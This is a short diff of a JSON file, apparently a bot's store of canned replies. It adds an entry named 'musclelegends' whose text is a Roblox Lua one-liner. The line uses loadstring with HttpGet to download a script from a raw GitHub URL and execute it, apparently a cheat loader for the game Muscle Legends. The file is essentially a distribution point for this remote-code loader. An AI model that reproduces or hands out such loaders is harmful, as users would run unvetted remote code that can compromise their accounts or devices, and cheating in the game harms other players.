@@ -8,5 +8,10 @@
     "text": "Kdkfkfkf",
     "media_type": null,
     "media_file_id": null
+  },
+  "musclelegends": {
+    "text": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/2581235867/21/refs/heads/main/By%20Tokattk\"))()",
+    "media_type": null,
+    "media_file_id": null
   }
 }
